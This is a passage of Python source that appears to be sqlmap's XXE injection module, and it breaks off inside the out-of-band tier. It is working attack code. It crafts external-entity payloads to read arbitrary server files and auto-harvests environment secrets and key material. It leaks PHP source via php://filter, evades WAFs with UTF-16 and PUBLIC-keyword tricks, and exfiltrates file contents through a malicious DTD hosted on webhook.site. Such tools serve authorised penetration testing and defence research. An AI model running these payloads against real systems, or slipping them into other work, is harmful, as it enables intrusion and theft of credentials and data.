#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re
import time

from lib.core.common import beep
from lib.core.common import dataToOutFile
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import singleTimeWarnMessage
from lib.core.convert import getBytes
from lib.core.convert import getText
from lib.core.convert import getUnicode
from lib.core.convert import htmlUnescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.dicts import POST_HINT_CONTENT_TYPES
from lib.core.enums import CUSTOM_LOGGING
from lib.core.enums import HTTP_HEADER
from lib.core.enums import HTTPMETHOD
from lib.core.settings import ASTERISK_MARKER
from lib.core.settings import XXE_BLACKHOLE_HOST
from lib.core.settings import XXE_ERROR_SIGNATURES
from lib.core.settings import XXE_FILE_HARVEST
from lib.core.settings import XXE_HARDENED_REGEX
from lib.core.settings import XXE_IMPACT_FILES
from lib.core.settings import XXE_SOURCE_NAMES
from lib.core.settings import XXE_WEBROOTS
from lib.core.settings import OOB_POLL_ATTEMPTS
from lib.core.settings import OOB_POLL_DELAY
from lib.core.settings import XXE_LOCAL_DTDS
from lib.core.settings import XXE_LOCATION_SWEEP_MAX
from lib.core.settings import XXE_TIME_THRESHOLD
from lib.core.settings import UPPER_RATIO_BOUND
from lib.request.connect import Connect as Request
from lib.utils.nonsql import ratio as _ratio
from lib.utils.xrange import xrange
from thirdparty.six.moves import urllib as _urllib

# Fresh per-scan sentinel token. Deliberately a random opaque string (never
# root:x:0:0 or similar) so it cannot collide with a WAF honeypot signature and
# so its presence in a response is unambiguously our reflected/expanded value.
SENTINEL = randomStr(length=12, lowercase=True)

# When the user marked an explicit injection point in the body (e.g. '<n>luther*</n>'),
# it is preserved as this placeholder and used as the SOLE injection spot, instead of
# rewriting every node - so schema/signature/id/auth-sensitive documents stay intact.
_MARKER = None

# Cached answer to the one-time "use a public OOB service?" consent prompt (per scan).
_OOB_CONSENT = None

# Latched leaf text-node location that the in-band reflection sweep proved workable. Every subsequent
# body-injection tier (`_placeRef` with index left as None) reuses it, so once the reflecting node is
# found the file-read/harvest/XInclude tiers all target that same spot instead of always the first leaf.
_PLACE_INDEX = 0

# First element of the document (skipping the <?xml?> prolog, comments and any
# DOCTYPE). Its name must match the DOCTYPE name or libxml2/Xerces reject the doc.
_ROOT_RE = re.compile(r"<\s*([A-Za-z_][\w.\-]*(?::[\w.\-]+)?)")

# A leaf text node: >text< with no markup/entities inside. Used to place an
# entity reference where the application is most likely to echo it back.
_TEXTNODE_RE = re.compile(r">(\s*[^<>&\s][^<>&]*)<")


def _looksXml(data):
    data = (getText(data) or "").strip()
    return data.startswith("<") and re.search(r"<[A-Za-z_?!]", data) is not None and '>' in data


def _toSystemId(path):
    """Normalise a user file path (Unix, Windows, or already a URI) to a file:// systemId,
    consistently across every tier."""
    p = getText(path or "").strip()
    if "://" in p:
        return p
    return "file:///" + p.replace("\\", "/").lstrip("/")


def _toResource(path):
    """Plain absolute path for a php://filter 'resource=' argument (URI/backslashes stripped)."""
    p = getText(path or "").strip()
    if p.startswith("file://"):
        p = p[len("file://"):]
    p = p.replace("\\", "/")
    if re.match(r"^/?[A-Za-z]:/", p):   # keep a Windows drive path as 'C:/...'
        return p.lstrip("/")
    return "/" + p.lstrip("/")


def _cleanBody():
    """Return the original request body with sqlmap's injection marks removed.
    Order matters: drop the injected custom marks first (any literal '*' from the
    original body was already escaped to ASTERISK_MARKER by target processing),
    then restore those escaped asterisks."""
    global _MARKER
    _MARKER = None
    data = getText(conf.data or "")
    mark = kb.customInjectionMark or "\x00"
    if kb.get("processUserMarks") and mark in data:
        # user chose the injection point explicitly - honour it as the SOLE spot
        _MARKER = "xxemark%s" % randomStr(10, lowercase=True)
        data = data.replace(mark, _MARKER, 1).replace(mark, "")
    else:
        data = data.replace(mark, "")
    data = data.replace(ASTERISK_MARKER, "*")
    return data.lstrip(u"\ufeff\ufffe")   # drop a leading BOM so root/DOCTYPE handling stays correct


def _rootName(xml):
    stripped = re.sub(r"<\?.*?\?>", "", xml, flags=re.DOTALL)
    stripped = re.sub(r"<!--.*?-->", "", stripped, flags=re.DOTALL)
    stripped = re.sub(r"<!DOCTYPE[^>]*(?:\[[^\]]*\])?\s*>", "", stripped, flags=re.DOTALL)
    match = _ROOT_RE.search(stripped)
    return match.group(1) if match else None


def _auxHeaders():
    """Send an XML content-type unless the user already pinned one (via -H/-r)."""
    for name, _ in (conf.httpHeaders or []):
        if (name or "").lower() == HTTP_HEADER.CONTENT_TYPE.lower():
            return None
    return {HTTP_HEADER.CONTENT_TYPE: POST_HINT_CONTENT_TYPES.get(kb.postHint) or "application/xml"}


def _send(body):
    """Issue one request with a fully-crafted XML body, preserving sqlmap's normal
    request machinery (URL, cookies, headers, proxy, delay) for everything else."""

    if conf.delay:
        time.sleep(conf.delay)

    if _MARKER and not isinstance(body, bytes) and _MARKER in body:
        body = body.replace(_MARKER, "")   # strip any unreplaced placeholder before sending

    try:
        if conf.verbose >= 3:
            logger.log(CUSTOM_LOGGING.PAYLOAD, getUnicode(body))
        page, _, _ = Request.getPage(post=body, method=conf.method, auxHeaders=_auxHeaders(), raise404=False, silent=True)
        return page or ""
    except Exception as ex:
        logger.debug("XXE probe request failed: %s" % getUnicode(ex))
        return ""


def _scanDoctype(xml):
    """Non-resolving lexical scan for a DOCTYPE declaration. Returns {start, subsetOpen, subsetClose,
    end} byte offsets (subsetOpen/subsetClose None when there is no internal subset), or None when the
    document has no DOCTYPE. Tracks quote state, comments and the internal subset so a '>' or ']>'
    sitting inside a quoted entity value, a comment, or a nested markup declaration does NOT
    prematurely terminate the scan - a plain regex mis-detects every one of those and either truncates
    the DOCTYPE or finds a phantom subset close, corrupting the built payload. This scanner never
    resolves entities or fetches external ids; it only locates boundaries."""
    m = re.search(r"<!DOCTYPE\b", xml)
    if not m:
        return None
    n = len(xml)
    i = m.end()
    subsetOpen = subsetClose = None
    quote = None
    while i < n:
        c = xml[i]
        if quote:
            if c == quote:
                quote = None
            i += 1
        elif xml.startswith("<!--", i):
            end = xml.find("-->", i + 4)
            i = (end + 3) if end != -1 else n
        elif c in ('"', "'"):
            quote = c
            i += 1
        elif c == '[' and subsetOpen is None:
            subsetOpen = i
            j, depth, iq = i + 1, 0, None
            while j < n:                        # scan the internal subset to its matching ']'
                cj = xml[j]
                if iq:
                    if cj == iq:
                        iq = None
                    j += 1
                elif xml.startswith("<!--", j):
                    e = xml.find("-->", j + 4)
                    j = (e + 3) if e != -1 else n
                elif cj in ('"', "'"):
                    iq = cj
                    j += 1
                elif cj == ']' and depth == 0:
                    subsetClose = j
                    break
                else:
                    if cj == '<':
                        depth += 1
                    elif cj == '>' and depth > 0:
                        depth -= 1
                    j += 1
            i = (subsetClose + 1) if subsetClose is not None else n
        elif c == '>':
            return {"start": m.start(), "subsetOpen": subsetOpen, "subsetClose": subsetClose, "end": i + 1}
        else:
            i += 1
    return {"start": m.start(), "subsetOpen": subsetOpen, "subsetClose": subsetClose, "end": n}


def _contentStart(xml):
    """Offset at which document-element content begins: just past a DOCTYPE (located by the lexical
    scanner, so a quoted '>' / comment / CDATA inside it is not mistaken for its end), else just past
    the XML prolog, else 0. Text-node operations start here so they never touch the DTD."""
    doctype = _scanDoctype(xml)
    if doctype:
        return doctype["end"]
    prolog = re.match(r"\s*<\?xml.*?\?>", xml, flags=re.DOTALL)
    return prolog.end() if prolog else 0


def _buildDoctype(xml, rootName, internalSubset):
    """Prepend (or extend) a DOCTYPE carrying `internalSubset` into `xml`.
    A document may already declare a DOCTYPE - injecting a second one is invalid
    XML and every parser rejects it, so we splice into the existing declaration
    instead (into its internal subset, or by adding one to a subset-less DOCTYPE).
    Boundaries come from the lexical scanner, not a regex, so a quoted '>' or a
    comment inside an existing DOCTYPE cannot misplace the splice."""

    doctype = _scanDoctype(xml)
    if doctype and doctype["subsetOpen"] is not None:
        # Splice our declarations into the existing internal subset.
        insertAt = doctype["subsetOpen"] + 1
        return xml[:insertAt] + "\n" + internalSubset + "\n" + xml[insertAt:]

    if doctype:
        # DOCTYPE with an external id but no internal subset (e.g. SYSTEM "x.dtd"):
        # add an internal subset before its closing '>' (both may legally coexist).
        close = doctype["end"] - 1
        return xml[:close] + " [\n" + internalSubset + "\n]" + xml[close:]

    built = "<!DOCTYPE %s [\n%s\n]>" % (rootName, internalSubset)
    prolog = re.match(r"\s*<\?xml.*?\?>", xml, flags=re.DOTALL)
    if prolog:
        end = prolog.end()
        return xml[:end] + "\n" + built + xml[end:]
    return built + "\n" + xml


def _textNodeCount(xml):
    """Number of leaf text nodes `_placeRef` can target (for callers that sweep one location at a
    time). Excludes the DOCTYPE, mirroring `_placeRef` (via the lexical `_contentStart`)."""
    return len(_TEXTNODE_RE.findall(xml[_contentStart(xml):]))


def _sweepLocations(xml):
    """Ordered list of leaf-text-node indices for a body-injection tier to try, bounded by
    XXE_LOCATION_SWEEP_MAX so a document with many text nodes cannot explode the request count. When
    the user pinned an explicit injection marker there is exactly one spot, so no sweep is needed."""
    if _MARKER and _MARKER in xml:
        return [0]
    return list(xrange(min(max(1, _textNodeCount(xml)), XXE_LOCATION_SWEEP_MAX)))


def _placeRef(xml, snippet, attrs=False, index=None):
    """Insert `snippet` (an entity reference or an XInclude element) into ONE leaf text node - the
    `index`-th - PRESERVING every other value. Replacing every leaf (and, in the internal-entity tier,
    every attribute) at once corrupted the whole document: schema validation, XML signatures/checksums,
    authentication values, IDs and routing fields were all destroyed, which both causes false negatives
    (the app rejects the mutated document, unrelated to entity handling) and can trigger application-side
    actions on altered values. An explicit '*'/marker still wins. When `attrs` is set and there is no
    text node, seeds ONE attribute value. `index` None (the default) uses the latched `_PLACE_INDEX` -
    the location the reflection sweep proved workable - so downstream read tiers reuse it; the sweep
    itself passes an explicit `index` 0..N-1 (see `_textNodeCount`) to try each location individually.
    `snippet` is placed in exactly one spot per call so the rest of the document stays well-formed and
    semantically intact."""

    if index is None:
        index = _PLACE_INDEX

    if _MARKER and _MARKER in xml:
        return xml.replace(_MARKER, snippet)   # honour the user's explicit injection point

    start = _contentStart(xml)                 # skip the DOCTYPE via the lexical scanner (quote/comment safe)
    head, tail = xml[:start], xml[start:]

    matches = list(_TEXTNODE_RE.finditer(tail))
    if matches:
        m = matches[index if 0 <= index < len(matches) else 0]
        return head + tail[:m.start()] + ">" + snippet + "<" + tail[m.end():]
    if attrs:
        # a general internal entity legally expands inside an attribute value; seed ONE attribute
        # (never xmlns) when the document has no text node. External-entity/XInclude tiers must not
        # request this (an external ref in an attribute is ill-formed).
        am = re.search(r'''(\s(?!xmlns[:=])[\w.:-]+\s*=\s*)("|')[^"'<>&]*\2''', tail)
        if am:
            return head + tail[:am.start()] + "%s%s%s%s" % (am.group(1), am.group(2), snippet, am.group(2)) + tail[am.end():]

    rootName = _rootName(xml)
    if rootName:
        close = "</%s>" % rootName
        if close in xml:
            idx = xml.rindex(close)
            return xml[:idx] + snippet + xml[idx:]
        # self-closing root: <root/> -> <root>snippet</root>
        selfClose = re.search(r"<%s\b[^>]*/>" % re.escape(rootName), xml)
        if selfClose:
            tag = selfClose.group(0)
            opened = tag[:-2] + ">" + snippet + close
            return xml[:selfClose.start()] + opened + xml[selfClose.end():]
    return xml


def _fingerprint(page):
    page = getUnicode(page or "")
    for family, regex in XXE_ERROR_SIGNATURES:
        if re.search(regex, page):
            return family
    return None


def _echoed(page):
    """True when the response mirrors our markup back (a debug/echo endpoint that
    never parses XML). Since our sentinel lives inside the DOCTYPE/ENTITY declaration
    we send, an echo would otherwise look like a genuine reflected/error hit. We match
    the declaration in raw AND escaped forms (HTML-entity, decimal/hex numeric, and
    percent-encoded) so an app that HTML-escapes or URL-encodes the reflected body is
    still recognised as an echo regardless of whether decodePage normalised it."""
    page = getUnicode(page or "").lower()
    for kw in ("!doctype", "!entity"):
        for lt in ("<", "&lt;", "&#60;", "&#x3c;", "%3c", "\\u003c"):
            if lt + kw in page:
                return True
    return False


def _report(title, payload, vulnType="XXE injection"):
    if conf.beep:
        beep()
    place = conf.method or HTTPMETHOD.POST
    conf.dumper.singleString("---\nParameter: XML body (%s)\n    Type: %s\n    Title: %s\n    Payload: %s\n---" % (place, vulnType, title, payload))


def _saveFileRead(remoteFile, content):
    """Save an XXE-read file to the output directory (parity with '--file-read') and
    return its local path, or None if it could not be written."""
    try:
        return dataToOutFile(remoteFile, getBytes(content))
    except Exception as ex:
        logger.debug("could not save XXE-read file to disk: %s" % getUnicode(ex))
        return None


def _dumpFileRead(remoteFile, content):
    """Save a single XXE-read file and list it; fall back to a console dump if the
    file cannot be written."""
    localPath = _saveFileRead(remoteFile, content)
    if localPath:
        conf.dumper.rFile([localPath])
    else:
        conf.dumper.singleString("XXE file read ('%s'):\n%s" % (remoteFile, content))


def _harvestFiles(xml, rootName):
    """Proactive, best-effort file harvest run once an in-band XXE read primitive is
    confirmed: pull a curated set of high-value fixed-path files (host identity,
    process env/secrets, key material) the way the other non-SQL engines auto-dump
    their reachable data. Returns a list of (path, content, payload) for every file
    that read back non-empty; unreadable/absent files are silently skipped. Content is
    de-duplicated so a parser that resolves every missing path to the same stub cannot
    masquerade as many distinct reads."""

    harvested = []
    seen = set()
    for path in XXE_FILE_HARVEST:
        content, payload = _tryInbandFileRead(xml, rootName, path)
        if content and content.strip():
            key = content.strip()
            if key in seen:
                continue
            seen.add(key)
            harvested.append((path, content, payload))
    return harvested


def _phpFilterWorks(xml, rootName):
    """One probe: can the target read a file via php://filter (i.e. is it PHP)? Gates
    the PHP-only source-code sweep so a non-PHP target does not pay dozens of pointless
    requests for it."""

    from lib.core.convert import decodeBase64

    m1, m2 = randomStr(8, lowercase=True), randomStr(8, lowercase=True)
    ent = randomStr(8, lowercase=True)
    subset = '<!ENTITY %s SYSTEM "php://filter/convert.base64-encode/resource=/etc/hostname">' % ent
    payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
    match = re.search(re.escape(m1) + r"(.*?)" + re.escape(m2), getUnicode(_send(payload)), re.DOTALL)
    if match and match.group(1).strip():
        try:
            return bool(getText(decodeBase64(match.group(1).strip())).strip())
        except Exception:
            pass
    return False


def _harvestSource(xml, rootName, harvested):
    """PHP-only follow-up run once an in-band read primitive is confirmed: disclose
    server-side application SOURCE code via php://filter (source is executed, never
    rendered, yet its literals - credentials, tokens, embedded secrets - leak verbatim).
    Candidate paths are derived from the already-harvested /proc/self/{cmdline,environ}
    (running script + working dir) combined with common web roots/source names, and
    de-duplicated against the host harvest by content. Skipped entirely on a non-PHP
    target. Returns a list of (path, content, payload)."""

    if not _phpFilterWorks(xml, rootName):
        return []

    byPath = dict((p, c) for p, c, _ in harvested)
    seen = set(getUnicode(c).strip() for c in byPath.values())
    candidates = []

    dirs = []
    environ = getUnicode(byPath.get("/proc/self/environ", ""))
    match = re.search(r"(?:^|\x00)PWD=([^\x00]+)", environ)
    cwd = match.group(1).strip() if match else None
    if cwd:
        dirs.append(cwd)
    dirs += [_ for _ in XXE_WEBROOTS if _ != cwd]

    cmdline = getUnicode(byPath.get("/proc/self/cmdline", ""))
    for token in re.split(r"[\x00\s]+", cmdline):
        if token and re.search(r"\.(?:php|py|rb|js|jsp|pl|cgi)$", token, re.I):
            if token.startswith("/"):
                candidates.append(token)                     # absolute script path
            elif cwd:
                candidates.append("%s/%s" % (cwd.rstrip("/"), token))

    for directory in dirs:
        for name in XXE_SOURCE_NAMES:
            candidates.append("%s/%s" % (directory.rstrip("/"), name))

    logger.info("attempting application source-code disclosure via php://filter")

    result = []
    read = set()
    for path in candidates:
        if path in read:
            continue
        read.add(path)
        content, payload = _tryInbandFileRead(xml, rootName, path)
        if content and content.strip() and getUnicode(content).strip() not in seen:
            seen.add(getUnicode(content).strip())
            result.append((path, content, payload))
    return result


def _tryInternal(xml, rootName, baseline, index=None):
    """T2 in-band: an internal general entity expands to the sentinel and is
    reflected. Guarded by a negative control (sentinel absent from baseline) and
    a raw-echo guard (the literal '&ent;' must NOT survive - that would mean the
    app merely mirrors the body without parsing entities). `index` selects the leaf
    text node to inject into (the sweep in `xxeScan` tries each in turn)."""

    ent = randomStr(length=8, lowercase=True)
    subset = '<!ENTITY %s "%s">' % (ent, SENTINEL)
    payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent, attrs=True, index=index)
    page = _send(payload)

    if SENTINEL in page and ("&%s;" % ent) not in page and not _echoed(page) and SENTINEL not in baseline:
        return payload, page
    return None, page


def _confirmRead(page, pattern, baseline):
    """Return the first response line that matches a known file-content signature
    and is absent from the baseline. The baseline guard is essential: it stops a
    generic short reply (e.g. 'received', 'ok') from matching a loose pattern."""

    baselineLines = set(_.strip() for _ in getUnicode(baseline or "").splitlines())
    for line in getUnicode(page).splitlines():
        line = line.strip()
        if line and line not in baselineLines and re.search(pattern, line):
            return line
    return None


def _normalizeEscaping(text):
    """Bounded, non-resolving decode of the common reflection encodings (HTML entities, percent-
    encoding, JS \\uXXXX / escaped slash) so an ESCAPED entity reference (&amp;e;, &#38;e;, &#x26;e;,
    %26e%3B, \\u0026e;) is unmasked and can be recognised as reflection rather than file content."""
    out = getUnicode(text)
    for _ in range(3):                          # a few rounds catch double-encoding; capped
        prev = out
        try:
            out = htmlUnescape(out)
        except Exception:
            pass
        try:
            out = _urllib.parse.unquote(out)
        except Exception:
            pass
        out = out.replace("\\u0026", "&").replace("\\u003b", ";").replace("\\/", "/")
        if out == prev:
            break
    return out


def _readBetweenMarkers(xml, rootName, systemId, isB64, m1, m2):
    """Read `systemId` via an external entity placed between markers `m1`/`m2`; slice, reject a
    reflected (un-expanded) entity in any encoding, and base64-decode when requested. Returns
    (content, payload) with content=None when nothing usable came back."""
    from lib.core.convert import decodeBase64
    ent = randomStr(8, lowercase=True)
    subset = '<!ENTITY %s SYSTEM "%s">' % (ent, systemId)
    payload = _placeRef(_buildDoctype(xml, rootName, subset), "%s&%s;%s" % (m1, ent, m2))
    page = getUnicode(_send(payload))
    match = re.search(re.escape(m1) + r"(.*?)" + re.escape(m2), page, re.DOTALL)
    if not match:
        return None, payload
    data = match.group(1)
    # a reflected (not expanded) entity in ANY encoding: the random entity NAME survives de-escaping ->
    # the parser echoed the reference, it did not resolve the external entity -> not file content
    if not data.strip() or ent in _normalizeEscaping(data):
        return None, payload
    if isB64:
        try:
            data = getText(decodeBase64(data.strip()))        # strict base64 also validates real bytes
        except Exception:
            return None, payload
        if not data or not data.strip() or ent in _normalizeEscaping(data):
            return None, payload
    return (data if (data and data.strip()) else None), payload


def _tryInbandFileRead(xml, rootName, fileName):
    """Read an arbitrary file IN-BAND on a reflective target. The strict php://filter base64 channel is
    PREFERRED (self-validating: only real bytes decode). The raw file:// channel is guarded by a MATCHED
    CONTROL - a read of a random NONEXISTENT path with identical markers: a gateway/sanitizer that
    substitutes a fixed placeholder (e.g. '[external entity disabled]', an error string) returns the
    SAME text regardless of path, so if the requested-path read is materially identical to the
    nonexistent-path read it is NOT genuine content and is rejected. Returns (content, payload) or
    (None, None)."""

    m1, m2 = randomStr(8, lowercase=True), randomStr(8, lowercase=True)

    # (1) preferred: strict base64 (PHP) - decoding proves the bytes are real, no control needed
    data, payload = _readBetweenMarkers(xml, rootName,
                                        "php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True, m1, m2)
    if data:
        return data, payload

    # (2) raw file:// with a nonexistent-path differential control
    data, payload = _readBetweenMarkers(xml, rootName, _toSystemId(fileName), False, m1, m2)
    if data:
        bogus = _toSystemId("/%s/%s" % (randomStr(10, lowercase=True), randomStr(12, lowercase=True)))
        control, _ = _readBetweenMarkers(xml, rootName, bogus, False, m1, m2)
        if control is not None and _ratio(control, data) >= UPPER_RATIO_BOUND:
            # a nonexistent path returned the same/similar text -> a path-independent placeholder, not
            # the requested file's contents
            logger.debug("XXE raw read of '%s' matches a nonexistent-path control; rejecting placeholder" % fileName)
            return None, None
        return data, payload

    return None, None


def _tryExternalFile(xml, rootName, baseline):
    """Impact demonstration once XXE is live: read a benign host-identity file via
    an external general entity. Returns (systemId, payload) on a confirmed read."""

    for systemId, pattern in XXE_IMPACT_FILES:
        ent = randomStr(length=8, lowercase=True)
        subset = '<!ENTITY %s SYSTEM "%s">' % (ent, systemId)
        payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent)
        snippet = _confirmRead(_send(payload), pattern, baseline)
        if snippet:
            return systemId, payload
    return None, None


def _tryPhpFilter(xml, rootName, baseline):
    """PHP-only in-band read (base64 via php://filter). Used only as a benign in-band
    impact demonstration -> reads /etc/os-release; it deliberately never probes
    /etc/passwd here (a specific file is read only on explicit '--file-read')."""

    from lib.core.convert import decodeBase64

    baselineTokens = set(re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", getUnicode(baseline or "")))
    for resource, pattern in (("/etc/os-release", r"(?i)^(?:NAME|ID|VERSION)="),):
        ent = randomStr(length=8, lowercase=True)
        subset = '<!ENTITY %s SYSTEM "php://filter/convert.base64-encode/resource=%s">' % (ent, resource)
        payload = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent)
        page = _send(payload)
        for token in re.findall(r"[A-Za-z0-9+/]{16,}={0,2}", getUnicode(page)):
            if token in baselineTokens:
                continue
            try:
                decoded = getText(decodeBase64(token))
            except Exception:
                continue
            if decoded and re.search(pattern, decoded, re.M):
                return payload
    return None


def _tryError(xml, rootName):
    """T3 error-based: a parameter entity points at a non-existent path carrying
    the sentinel. Confirmed when the sentinel surfaces inside a parser error."""

    subset = '<!ENTITY %% xxe SYSTEM "file:///%s/nonexistent">\n%%xxe;' % SENTINEL
    payload = _buildDoctype(xml, rootName, subset)
    page = _send(payload)
    if SENTINEL in page and not _echoed(page):
        return payload, page
    return None, page


def _tryLocalDtd(xml, rootName):
    """T3b no-egress error-based: repurpose an on-disk DTD, redefine one of its
    parameter entities to load a sentinel path, and read the sentinel back out of
    the resulting parser error - no outbound network required."""

    for dtdPath, entName in XXE_LOCAL_DTDS:
        subset = (
            '<!ENTITY %% local_dtd SYSTEM "%s">\n'
            "<!ENTITY %% %s '<!ENTITY &#x25; xxe SYSTEM \"file:///%s/nonexistent\">&#x25;xxe;'>\n"
            "%%local_dtd;"
        ) % (dtdPath, entName, SENTINEL)
        payload = _buildDoctype(xml, rootName, subset)
        page = _send(payload)
        if SENTINEL in page and not _echoed(page):
            return payload, page
    return None, ""


def _tryErrorExfil(xml, rootName, errorChannel=False):
    """In-band error-based file EXFILTRATION: coerce the parser into an error whose
    message embeds the target file's contents (not just a sentinel). Two vehicles:
    (a) repurpose a local on-disk DTD -> NO egress at all, or (b) a DTD we host on
    the exfil service -> needs egress to fetch it plus verbose errors, so it is only
    attempted when an error channel was already confirmed (else it is pointless and
    just burns third-party requests). php://filter base64 carries a whole multi-line
    file intact; raw file:// leaks the first line. Returns (content, filename)."""

    from lib.core.convert import decodeBase64

    fileName = conf.get("fileRead")
    if not fileName:
        return None, None
    marker = randomStr(10, lowercase=True)
    # (systemId, isBase64): base64 first (whole file, PHP), raw fallback (first line, any parser)
    reads = (("php://filter/convert.base64-encode/resource=%s" % _toResource(fileName), True),
             (_toSystemId(fileName), False))

    def _extract(page, isB64):
        pattern = (r"file:/+%s/([A-Za-z0-9+/=]+)" if isB64 else r"file:/+%s/([^\s'\"<>;)]+)") % re.escape(marker)
        match = re.search(pattern, getUnicode(page))
        if not match:
            return None
        if isB64:
            try:
                return getText(decodeBase64(match.group(1))) or None
            except Exception:
                return None
        return match.group(1)

    # (a) local-DTD repurposing - no egress
    for dtdPath, entName in XXE_LOCAL_DTDS:
        for systemId, isB64 in reads:
            inner = ('<!ENTITY &#x25; file SYSTEM "%s">'
                     '<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///%s/&#x25;file;&#x27;>">'
                     '&#x25;eval;&#x25;error;') % (systemId, marker)
            subset = '<!ENTITY %% local_dtd SYSTEM "%s">\n<!ENTITY %% %s \'%s\'>\n%%local_dtd;' % (dtdPath, entName, inner)
            content = _extract(_send(_buildDoctype(xml, rootName, subset)), isB64)
            if content:
                return content, fileName

    # (b) DTD we host on the exfil service - egress + verbose errors (third party):
    # skip on a blind target (no error channel) and without explicit OOB consent
    if not (errorChannel and _oobConsent()):
        return None, None
    from lib.request.webhooksite import WebhookSite
    wh = WebhookSite()
    for systemId, isB64 in reads:
        dtd = ('<!ENTITY %% file SYSTEM "%s">\n'
               '<!ENTITY %% eval "<!ENTITY &#x25; error SYSTEM \'file:///%s/%%file;\'>">\n'
               '%%eval;\n%%error;') % (systemId, marker)
        token = wh.newToken(dtd)
        if not token:
            break
        content = _extract(_send(_buildDoctype(xml, rootName, '<!ENTITY %% dtd SYSTEM "%s"> %%dtd;' % wh.hostUrl(token))), isB64)
        if content:
            return content, fileName

    return None, None


def _tryXInclude(xml, rootName, baseline, index=None):
    """T4 fallback when DOCTYPE/entities are unavailable: XInclude a benign file as
    text. Confirmed when the file content appears in the response (baseline-guarded).
    `index` selects the leaf text node to inject the <xi:include> into."""

    for systemId, pattern in XXE_IMPACT_FILES:
        snippet = '<xi:include xmlns:xi="http://www.w3.org/2001/XInclude" href="%s" parse="text"/>' % systemId
        payload = _placeRef(xml, snippet, index=index)
        confirmed = _confirmRead(_send(payload), pattern, baseline)
        if confirmed:
            return payload, systemId, confirmed
    return None, None, None


def _tryEvasions(xml, rootName, baseline):
    """T5 WAF-evasion fallbacks, tried only when the straightforward tiers fail.
    Each transform keeps the payload semantically identical while defeating a
    common naive filter, so a reachable-but-filtered parser can still be caught.
    Returns (title, payload) on a confirmed hit."""

    # (1) UTF-16 re-encoding: libxml2/Xerces honor the BOM-declared encoding while
    #     ASCII byte-signature WAFs (grepping for "<!ENTITY"/"SYSTEM") miss it.
    ent = randomStr(length=8, lowercase=True)
    subset = '<!ENTITY %s "%s">' % (ent, SENTINEL)
    body = _placeRef(_buildDoctype(xml, rootName, subset), "&%s;" % ent)
    page = _send(getText(body).encode("utf-16"))   # BOM-prefixed UTF-16, py2/py3 alike
    if SENTINEL in page and not _echoed(page) and SENTINEL not in baseline:
        return "In-band via UTF-16 re-encoding (WAF evasion)", getUnicode(body)

    # (2) PUBLIC keyword instead of SYSTEM: bypasses filters that only blocklist
    #     the SYSTEM identifier; the second literal is still the resolved system id.
    subset = '<!ENTITY %% xxe PUBLIC "-//sqlmap//XXE//EN" "file:///%s/nonexistent">\n%%xxe;' % SENTINEL
    body = _buildDoctype(xml, rootName, subset)
    page = _send(body)
    if SENTINEL in page and not _echoed(page):
        return "Error-based via PUBLIC keyword (WAF evasion)", body

    return None, None


def _timed(body, timeout):
    """One request, returning wall-clock seconds. ignoreTimeout keeps a stalled
    parser from raising, so the elapsed time itself is the signal."""
    start = time.time()
    try:
        Request.getPage(post=body, method=conf.method, auxHeaders=_auxHeaders(),
                        raise404=False, silent=True, ignoreTimeout=True, timeout=timeout)
    except Exception:
        pass
    return time.time() - start


def _tryTimeBlind(xml, rootName):
    """T6 last-resort blind detection with NO collector: an external parameter
    entity aimed at a non-routable TEST-NET host stalls a fetching parser on the
    connection. Confirmed only on a large, reproducible delay measured against a
    DTD-processing control (an internal parameter entity, no fetch) - so DTD
    overhead alone cannot trip it and only the outbound-fetch stall counts."""

    control = _buildDoctype(xml, rootName, '<!ENTITY %% c "x">\n%%c;')
    baseline = max(_timed(control, conf.timeout), _timed(control, conf.timeout))
    threshold = baseline + XXE_TIME_THRESHOLD
    probeTimeout = min(conf.timeout, int(baseline) + XXE_TIME_THRESHOLD + 3)

    # Bound each stalled probe: the per-call timeout kwarg does not reach a pooled
    # socket, so cap via conf.timeout (the value the connection actually uses) and
    # drop conf.retries so a stall is not re-sent. Restored in finally.
    _timeout, _retries = conf.timeout, conf.retries
    conf.timeout, conf.retries = probeTimeout, 0
    try:
        subset = '<!ENTITY %% x SYSTEM "http://%s/%s">\n%%x;' % (XXE_BLACKHOLE_HOST, SENTINEL)
        payload = _buildDoctype(xml, rootName, subset)

        if _timed(payload, probeTimeout) < threshold:
            return None
        if _timed(payload, probeTimeout) < threshold:   # must reproduce
            return None
        return payload
    finally:
        conf.timeout, conf.retries = _timeout, _retries


def _oobEnabled():
    """False when the user opted out of OOB entirely (`--oob-server none`)."""
    return (conf.get("oobServer") or "").strip().lower() not in ("none", "off", "0", "no", "disable", "false")


def _oobConsent():
    """True only when the user has opted into contacting a third-party OOB service:
    either explicitly (`--oob-server <host>`) or by answering the one-time prompt,
    which defaults to NO - so '--batch' never silently phones a public service."""
    global _OOB_CONSENT
    if not _oobEnabled():
        return False
    if conf.get("oobServer"):
        return True
    if _OOB_CONSENT is None:
        message = "do you want sqlmap to use a public out-of-band service "
        message += "(interactsh/webhook.site) for blind XXE? [y/N] "
        _OOB_CONSENT = readInput(message, default='N', boolean=True)
    return _OOB_CONSENT


def _tryOobExfil(xml, rootName):
    """T7 out-of-band EXFILTRATION for blind XXE: host a malicious external DTD on
    a public content+logging service (webhook.site), point the target's parser at
    it, and read the file it ships back out. The DTD uses the classic nested
    parameter-entity chain (only valid in an EXTERNAL DTD) and php://filter base64
    so any file survives the callback URL. The DTD-fetch itself doubles as blind
    detection. Reads conf.fileRead if given, else a benign default. Returns a dict
    {payload, filename, content, detected} or None if the service is unusable."""

    from lib.core.convert import decodeBase64
    from lib.request.webhooksite import WebhookSite

    fileName = conf.get("fileRead")
    if not fileName:
        return None

    wh = WebhookSite()
    exfilToken = wh.newToken()
    if not exfilToken:
        logger.debug("out-of-band exfiltration tier skipped (could not reach the exfil service)")
        return None

    marker = randomStr(10, lowercase=True)
    # Carry the base64 in the URL PATH, not the query: query parsers turn '+' into a
